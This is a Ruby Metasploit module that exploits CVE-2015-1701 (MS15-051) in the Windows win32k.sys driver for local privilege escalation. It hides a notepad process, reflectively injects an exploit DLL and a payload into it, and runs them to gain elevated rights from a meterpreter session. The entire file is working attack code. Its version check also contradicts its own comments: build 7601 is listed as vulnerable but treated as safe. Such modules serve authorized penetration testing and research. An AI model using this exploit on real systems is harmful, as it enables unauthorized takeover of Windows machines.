##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'            => 'Windows ClientCopyImage Win32k Exploit',
      'Description'     => %q{
        This module exploits improper object handling in the win32k.sys kernel mode driver.
        This module has been tested on vulnerable builds of Windows 7 x64 and x86, and
        Windows 2008 R2 SP1 x64.
      },
      'License'         => MSF_LICENSE,
      'Author'          => [
          'Unknown',    # vulnerability discovery and exploit in the wild
          'hfirefox',   # Code released on github
          'OJ Reeves'   # msf module
        ],
      'Arch'            => [ ARCH_X86, ARCH_X86_64 ],
      'Platform'        => 'win',
      'SessionTypes'    => [ 'meterpreter' ],
      'DefaultOptions'  => {
          'EXITFUNC'    => 'thread',
        },
      'Targets'         => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'Payload'         => {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'      => [
          ['CVE', '2015-1701'],
          ['MSB', 'MS15-051'],
          ['URL', 'https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html'],
          ['URL', 'https://github.com/hfiref0x/CVE-2015-1701'],
          ['URL', 'https://technet.microsoft.com/library/security/MS15-051']
        ],
      'DisclosureDate'  => 'May 12 2015',
      'DefaultTarget'   => 0
    }))
  end

  def check
    # Windows Server 2008 Enterprise SP2 (32-bit)  6.0.6002.18005 (Does not work)
    # Winodws 7 SP1 (64-bit)                       6.1.7601.17514 (Works)
    # Windows 7 SP1 (32-bit)                       6.1.7601.17514 (Works)
    # Windows Server 2008 R2 (64-bit) SP1          6.1.7601.17514 (Works)

    if sysinfo['OS'] !~ /windows/i
      return Exploit::CheckCode::Unknown
    end

    if sysinfo['Architecture'] =~ /(wow|x)64/i
      arch = ARCH_X86_64
    elsif sysinfo['Architecture'] =~ /x86/i
      arch = ARCH_X86
    end

    file_path = expand_path('%windir%') << '\\system32\\win32k.sys'
    major, minor, build, revision, branch = file_version(file_path)
    vprint_status("win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}")

    return Exploit::CheckCode::Safe if build == 7601

    return Exploit::CheckCode::Detected
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if check == Exploit::CheckCode::Safe || check == Exploit::CheckCode::Unknown
      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')
    end

    if sysinfo['Architecture'] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    elsif sysinfo['Architecture'] =~ /x64/ && target.arch.first == ARCH_X86
      fail_with(Failure::NoTarget, 'Session host is x64, but the target is specified as x86')
    elsif sysinfo['Architecture'] =~ /x86/ && target.arch.first == ARCH_X86_64
      fail_with(Failure::NoTarget, 'Session host is x86, but the target is specified as x64')
    end

    print_status('Launching notepad to host the exploit...')
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Reader Sandbox won't allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    if target.arch.first == ARCH_X86
      dll_file_name = 'cve-2015-1701.x86.dll'
    else
      dll_file_name = 'cve-2015-1701.x64.dll'
    end

    library_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-1701', dll_file_name)
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, payload_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end

end
